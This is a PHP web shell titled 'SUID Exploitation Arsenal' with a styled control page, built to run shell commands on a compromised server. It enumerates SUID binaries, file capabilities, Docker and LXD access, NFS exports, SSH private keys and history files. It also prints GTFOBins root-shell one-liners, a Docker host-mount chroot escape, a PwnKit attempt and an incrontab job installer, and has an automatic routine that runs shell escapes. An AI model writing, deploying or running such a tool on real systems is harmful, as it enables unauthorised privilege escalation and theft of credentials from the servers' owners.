<?php
error_reporting(0);
set_time_limit(0);

function cmd($c) {
    return shell_exec($c . ' 2>&1');
}

if(isset($_GET['mass'])) {
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="suid_exploit_results_' . date('Y-m-d_H-i-s') . '.txt"');
    
    echo "╔═══════════════════════════════════════════════════════════════╗\n";
    echo "║           SUID BINARY MASS EXPLOITATION REPORT               ║\n";
    echo "║                  Generated: " . date('Y-m-d H:i:s') . "                  ║\n";
    echo "╚═══════════════════════════════════════════════════════════════╝\n\n";
    
    $tests = [
        'system_info' => 'SYSTEM INFORMATION',
        'all_suid' => 'ALL SUID BINARIES',
        'pkexec' => 'PKEXEC (CVE-2021-4034)',
        'quota' => 'QUOTA BINARY',
        'suexec' => 'APACHE SUEXEC',
        'unix_chkpwd' => 'UNIX_CHKPWD',
        'incrontab' => 'INCRONTAB',
        'gtfobins' => 'GTFOBINS SUID',
        'capabilities' => 'FILE CAPABILITIES',
        'nfs' => 'NFS EXPLOIT',
        'lxd' => 'LXD/LXC',
        'docker' => 'DOCKER',
        'writable_paths' => 'WRITABLE PATHS',
        'interesting_files' => 'INTERESTING FILES'
    ];
    
    foreach($tests as $key => $title) {
        echo "\n" . str_repeat("═", 70) . "\n";
        echo "  $title\n";
        echo str_repeat("═", 70) . "\n\n";
        
        switch($key) {
            case 'system_info':
                echo cmd('uname -a');
                echo "\n\n";
                echo cmd('cat /etc/os-release');
                echo "\n\nCurrent User:\n";
                echo cmd('id');
                echo "\n\nGroups:\n";
                echo cmd('groups');
                break;
                
            case 'all_suid':
                echo cmd('find / -perm -4000 -type f 2>/dev/null');
                break;
                
            case 'pkexec':
                echo "Version:\n";
                echo cmd('pkexec --version');
                echo "\n\nSUID Status:\n";
                echo cmd('ls -la /usr/bin/pkexec');
                echo "\n\nPatch Check:\n";
                echo cmd('rpm -qa | grep polkit || dpkg -l | grep polkit');
                break;
                
            case 'quota':
                echo cmd('which quota');
                echo cmd('quota --version');
                echo "\n";
                echo cmd('ls -la /usr/bin/quota');
                break;
                
            case 'suexec':
                echo cmd('/usr/sbin/suexec -V 2>&1');
                echo "\n";
                echo cmd('ls -la /usr/sbin/suexec');
                break;
                
            case 'unix_chkpwd':
                echo cmd('ls -la /usr/sbin/unix_chkpwd');
                break;
                
            case 'incrontab':
                echo cmd('ls -la /usr/bin/incrontab');
                echo "\n\nCurrent incron jobs:\n";
                echo cmd('incrontab -l 2>&1');
                break;
                
            case 'gtfobins':
                $bins = ['find', 'vim', 'awk', 'perl', 'python', 'python3', 'ruby', 'php', 'nmap', 'git', 'tar', 'zip', 'less', 'more'];
                foreach($bins as $bin) {
                    $path = trim(cmd("which $bin 2>/dev/null"));
                    if($path) {
                        $ls = cmd("ls -la $path");
                        if(strpos($ls, 's') !== false) {
                            echo "[$bin] FOUND WITH SUID!\n$ls\n";
                        }
                    }
                }
                break;
                
            case 'capabilities':
                echo cmd('getcap -r / 2>/dev/null | head -50');
                break;
                
            case 'nfs':
                echo cmd('cat /etc/fstab | grep nfs');
                echo "\n";
                echo cmd('mount | grep nfs');
                echo "\n";
                echo cmd('showmount -e localhost 2>&1');
                break;
                
            case 'lxd':
                echo cmd('which lxc');
                echo cmd('which lxd');
                echo "\nUser groups:\n";
                echo cmd('groups | grep -E "lxd|lxc"');
                break;
                
            case 'docker':
                echo cmd('groups | grep docker');
                echo "\n";
                echo cmd('ls -la /var/run/docker.sock 2>&1');
                echo "\n";
                echo cmd('docker ps 2>&1');
                break;
                
            case 'writable_paths':
                echo "/tmp contents:\n";
                echo cmd('ls -la /tmp | head -30');
                echo "\n\nWritable in /opt:\n";
                echo cmd('find /opt -writable -type d 2>/dev/null | head -20');
                echo "\n\nWritable in /var:\n";
                echo cmd('find /var -writable -type d 2>/dev/null | head -20');
                break;
                
            case 'interesting_files':
                echo "History files:\n";
                echo cmd('ls -la ~/.bash_history ~/.mysql_history ~/.python_history 2>&1');
                echo "\n\nSSH keys:\n";
                echo cmd('find /home -name id_rsa -o -name id_dsa 2>/dev/null | head -10');
                echo "\n\nConfig files:\n";
                echo cmd('find /home -name "*.conf" 2>/dev/null | head -20');
                break;
        }
        
        echo "\n";
    }
    
    echo "\n" . str_repeat("═", 70) . "\n";
    echo "  END OF REPORT\n";
    echo str_repeat("═", 70) . "\n";
    exit;
}

if(isset($_GET['test'])) {
    header('Content-Type: text/plain');
    $test = $_GET['test'];
    
    switch($test) {
        case 'pkexec':
            echo "=== PKEXEC (CVE-2021-4034) TEST ===\n\n";
            echo "Version:\n";
            echo cmd('pkexec --version');
            echo "\n\nBinary info:\n";
            echo cmd('ls -la /usr/bin/pkexec');
            echo "\n\nPolkit version:\n";
            echo cmd('rpm -qa | grep polkit || dpkg -l | grep polkit');
            echo "\n\nPatch status:\n";
            $ver = cmd('rpm -qa polkit 2>&1 || dpkg -l polkit 2>&1');
            if(strpos($ver, '0.105') !== false || strpos($ver, '0.113') !== false) {
                echo "⚠️ POTENTIALLY VULNERABLE!\n";
            } else {
                echo "Likely patched\n";
            }
            break;
            
        case 'quota':
            echo "=== QUOTA BINARY TEST ===\n\n";
            echo cmd('which quota');
            echo "\n";
            echo cmd('quota --version 2>&1');
            echo "\n";
            echo cmd('ls -la /usr/bin/quota');
            echo "\n\nGTFOBins check:\n";
            echo "If SUID, can read files as root:\n";
            echo "  quota -x 2>&1 | head\n";
            break;
            
        case 'suexec':
            echo "=== APACHE SUEXEC TEST ===\n\n";
            echo cmd('/usr/sbin/suexec -V 2>&1');
            echo "\n\n";
            echo cmd('ls -la /usr/sbin/suexec');
            echo "\n\nApache user:\n";
            echo cmd('ps aux | grep apache | head -3');
            break;
            
        case 'unix_chkpwd':
            echo "=== UNIX_CHKPWD TEST ===\n\n";
            echo cmd('ls -la /usr/sbin/unix_chkpwd');
            echo "\n\nThis validates passwords for PAM\n";
            echo "Known vulns: symlink attacks, buffer overflows\n";
            break;
            
        case 'incrontab':
            echo "=== INCRONTAB TEST ===\n\n";
            echo cmd('ls -la /usr/bin/incrontab');
            echo "\n\nCurrent jobs:\n";
            echo cmd('incrontab -l 2>&1');
            echo "\n\nAttempting to create job:\n";
            $job = "/tmp IN_CREATE /bin/bash /tmp/trigger.sh\n";
            file_put_contents('/tmp/incron_test', $job);
            echo cmd('incrontab /tmp/incron_test 2>&1');
            echo "\n\nVerify:\n";
            echo cmd('incrontab -l 2>&1');
            break;
            
        case 'gtfobins':
            echo "=== GTFOBINS SUID SCAN ===\n\n";
            $bins = [
                'find' => 'find . -exec /bin/sh -p \; -quit',
                'vim' => 'vim -c ":py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")"',
                'nmap' => 'nmap --interactive (old versions)',
                'awk' => 'awk "BEGIN {system(\"/bin/sh -p\")}"',
                'perl' => 'perl -e "exec \"/bin/sh\";"',
                'python' => 'python -c "import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")"',
                'ruby' => 'ruby -e "exec \"/bin/sh\""',
                'php' => 'php -r "pcntl_exec(\"/bin/sh\", [\"-p\"]);"',
                'tar' => 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
                'git' => 'git help config (then !/bin/sh)',
                'less' => 'less /etc/profile (then !sh)',
                'more' => 'more /etc/profile (then !sh)',
            ];
            
            foreach($bins as $bin => $exploit) {
                $path = trim(cmd("which $bin 2>/dev/null"));
                if($path) {
                    $ls = cmd("ls -la $path");
                    $suid = (strpos($ls, 's') !== false && strpos($ls, '-r') !== false);
                    $status = $suid ? "⚠️ SUID!" : "No SUID";
                    echo "[$bin] $status\n";
                    echo "  Path: $path\n";
                    if($suid) {
                        echo "  Exploit: $exploit\n";
                    }
                    echo "\n";
                }
            }
            break;
            
        case 'capabilities':
            echo "=== FILE CAPABILITIES ===\n\n";
            echo cmd('getcap -r / 2>/dev/null');
            echo "\n\nIf getcap not found, checking common paths:\n";
            $paths = ['/usr/bin', '/usr/sbin', '/usr/local/bin', '/bin', '/sbin'];
            foreach($paths as $p) {
                echo cmd("find $p -type f -executable 2>/dev/null | head -20");
            }
            break;
            
        case 'nfs':
            echo "=== NFS EXPLOIT ===\n\n";
            echo cmd('cat /etc/exports 2>&1');
            echo "\n\n";
            echo cmd('showmount -e localhost 2>&1');
            echo "\n\nMounted NFS:\n";
            echo cmd('mount | grep nfs');
            break;
            
        case 'lxd':
            echo "=== LXD/LXC CHECK ===\n\n";
            echo cmd('id | grep -E "lxd|lxc"');
            echo "\n\n";
            echo cmd('ls -la /var/lib/lxd 2>&1');
            echo "\n\n";
            echo cmd('lxc list 2>&1');
            break;
            
        case 'docker':
            echo "=== DOCKER CHECK ===\n\n";
            echo cmd('id | grep docker');
            echo "\n\n";
            echo cmd('ls -la /var/run/docker.sock 2>&1');
            echo "\n\n";
            echo cmd('docker ps 2>&1');
            echo "\n\nIf docker group access, can mount host:\n";
            echo "docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n";
            break;
            
        case 'exploit_pkexec':
            echo "=== PKEXEC EXPLOIT ATTEMPT ===\n\n";
            $dir = '/tmp/.pwnkit_' . rand(10000, 99999);
            mkdir($dir, 0777);
            echo "Exploit dir: $dir\n\n";
            
            // Method 1: Basic test
            echo "Test 1: Basic vulnerability check\n";
            echo cmd("pkexec --version 2>&1");
            
            // Method 2: Environment manipulation
            echo "\n\nTest 2: Environment exploit\n";
            putenv("SHELL=/tmp/evil.sh");
            putenv("XAUTHORITY=value");
            echo cmd("pkexec /usr/bin/id 2>&1");
            
            // Check results
            echo "\n\nChecking for rootbash:\n";
            echo cmd("ls -la /tmp/rootbash /tmp/pwned /tmp/evil 2>&1");
            
            echo "\n\n⚠️ If exploit worked, check /tmp for SUID shells\n";
            break;
            
        case 'auto_exploit':
            echo "=== AUTOMATED EXPLOITATION ===\n\n";
            
            // Try all quick wins
            $exploits = [
                'find' => "find . -exec /bin/sh -p \; -quit 2>&1",
                'nmap' => "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse && nmap --script=/tmp/x.nse 2>&1",
            ];
            
            foreach($exploits as $name => $cmd) {
                $bin = trim(shell_exec("which $name 2>/dev/null"));
                if($bin && strpos(shell_exec("ls -la $bin"), 's') !== false) {
                    echo "Trying $name...\n";
                    echo shell_exec($cmd);
                    echo "\n\n";
                }
            }
            
            echo "Done. Check output for shell prompts.\n";
            break;
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>SUID Exploit Arsenal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #000000 0%, #1a0033 50%, #330033 100%);
            color: #00ff41; 
            font-family: 'Courier New', monospace; 
            padding: 20px;
            min-height: 100vh;
        }
        h1 { 
            text-align: center; 
            color: #ff0066;
            text-shadow: 0 0 20px #ff0066, 0 0 40px #ff0066;
            margin-bottom: 20px;
            font-size: 2.8em;
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 20px #ff0066; }
            to { text-shadow: 0 0 40px #ff0066, 0 0 60px #ff0066; }
        }
        .mass-btn {
            display: block;
            margin: 0 auto 30px;
            background: linear-gradient(45deg, #ff0066, #ff3366);
            color: #fff;
            border: none;
            padding: 20px 60px;
            font-size: 1.5em;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 10px 30px rgba(255,0,102,0.5);
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }
        .mass-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(255,0,102,0.7);
        }
        .warning {
            background: rgba(255,0,102,0.1);
            border: 3px solid #ff0066;
            padding: 20px;
            margin-bottom: 30px;
            border-radius: 10px;
            text-align: center;
            font-size: 1.1em;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { border-color: #ff0066; }
            50% { border-color: #ff3366; }
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .card {
            background: linear-gradient(135deg, rgba(0,255,65,0.05) 0%, rgba(0,255,65,0.1) 100%);
            border: 2px solid #00ff41;
            padding: 25px;
            border-radius: 15px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        .card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0,255,65,0.1) 0%, transparent 70%);
            opacity: 0;
            transition: opacity 0.3s;
        }
        .card:hover::before { opacity: 1; }
        .card:hover {
            transform: translateY(-10px) scale(1.02);
            box-shadow: 0 15px 40px rgba(0,255,65,0.4);
            border-color: #00ff88;
        }
        .card.danger { 
            border-color: #ff0066; 
            background: linear-gradient(135deg, rgba(255,0,102,0.05) 0%, rgba(255,0,102,0.1) 100%);
        }
        .card.danger:hover { 
            border-color: #ff3366;
            box-shadow: 0 15px 40px rgba(255,0,102,0.4); 
        }
        .card h3 {
            color: #ff0066;
            margin-bottom: 12px;
            font-size: 1.4em;
        }
        .card p {
            color: #00ff41;
            font-size: 0.95em;
            line-height: 1.6;
        }
        .badge {
            position: absolute;
            top: 15px;
            right: 15px;
            background: #ff0066;
            color: #fff;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.75em;
            font-weight: bold;
            text-transform: uppercase;
            box-shadow: 0 5px 15px rgba(255,0,102,0.5);
        }
        pre {
            background: #000;
            border: 2px solid #00ff41;
            padding: 20px;
            border-radius: 10px;
            overflow-x: auto;
            max-height: 700px;
            overflow-y: auto;
            color: #00ff41;
            font-size: 14px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        #result { margin-top: 40px; }
        .loading {
            text-align: center;
            font-size: 1.8em;
            color: #ff0066;
            animation: pulse 1s infinite;
        }
        .icon { 
            font-size: 3em; 
            margin-bottom: 15px; 
            text-align: center;
            filter: drop-shadow(0 0 10px currentColor);
        }
    </style>
</head>
<body>
    <h1>⚔️ SUID EXPLOITATION ARSENAL ⚔️</h1>
    
    <button class="mass-btn" onclick="massExport()">
        📥 DOWNLOAD FULL REPORT
    </button>
    
    <div class="warning">
        ⚠️ ALL TESTS - SINGLE FILE EXPORT - COMPLETE ENUMERATION ⚠️
    </div>
    
    <div class="grid">
        <div class="card danger" onclick="test('pkexec')">
            <span class="badge">CVE-2021-4034</span>
            <div class="icon">🔓</div>
            <h3>PkExec Polkit</h3>
            <p>PwnKit - Local root escalation</p>
        </div>
        
        <div class="card" onclick="test('quota')">
            <div class="icon">📊</div>
            <h3>Quota Binary</h3>
            <p>SUID quota GTFOBins abuse</p>
        </div>
        
        <div class="card" onclick="test('suexec')">
            <div class="icon">🕸️</div>
            <h3>Apache Suexec</h3>
            <p>CGI execution as other users</p>
        </div>
        
        <div class="card" onclick="test('unix_chkpwd')">
            <div class="icon">🔑</div>
            <h3>Unix Chkpwd</h3>
            <p>PAM password validator</p>
        </div>
        
        <div class="card" onclick="test('incrontab')">
            <div class="icon">⏰</div>
            <h3>Incrontab</h3>
            <p>Filesystem event cron</p>
        </div>
        
        <div class="card" onclick="test('gtfobins')">
            <div class="icon">📖</div>
            <h3>GTFOBins Scan</h3>
            <p>All exploitable SUID binaries</p>
        </div>
        
        <div class="card" onclick="test('capabilities')">
            <div class="icon">⚡</div>
            <h3>Capabilities</h3>
            <p>File capabilities enumeration</p>
        </div>
        
        <div class="card" onclick="test('nfs')">
            <div class="icon">🗂️</div>
            <h3>NFS Exploit</h3>
            <p>no_root_squash privilege escalation</p>
        </div>
        
        <div class="card" onclick="test('lxd')">
            <div class="icon">📦</div>
            <h3>LXD/LXC</h3>
            <p>Container escape to host</p>
        </div>
        
        <div class="card" onclick="test('docker')">
            <div class="icon">🐳</div>
            <h3>Docker</h3>
            <p>Docker socket root access</p>
        </div>
        
        <div class="card danger" onclick="test('exploit_pkexec')">
            <span class="badge">EXPLOIT</span>
            <div class="icon">💥</div>
            <h3>RUN PKEXEC</h3>
            <p>Execute PwnKit exploitation</p>
        </div>
        
        <div class="card danger" onclick="test('auto_exploit')">
            <span class="badge">AUTO</span>
            <div class="icon">🤖</div>
            <h3>Auto Exploit</h3>
            <p>Try all quick wins automatically</p>
        </div>
    </div>
    
    <div id="result"></div>
    
    <script>
        function test(type) {
            const result = document.getElementById('result');
            result.innerHTML = '<div class="loading">⏳ Running test...</div>';
            result.scrollIntoView({ behavior: 'smooth' });
            
            fetch('?test=' + type)
                .then(r => r.text())
                .then(data => {
                    result.innerHTML = '<pre>' + escapeHtml(data) + '</pre>';
                });
        }
        
        function massExport() {
            const btn = document.querySelector('.mass-btn');
            btn.textContent = '⏳ GENERATING REPORT...';
            btn.disabled = true;
            
            window.location.href = '?mass=1';
            
            setTimeout(() => {
                btn.textContent = '📥 DOWNLOAD FULL REPORT';
                btn.disabled = false;
            }, 3000);
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
    </script>
</body>
</html>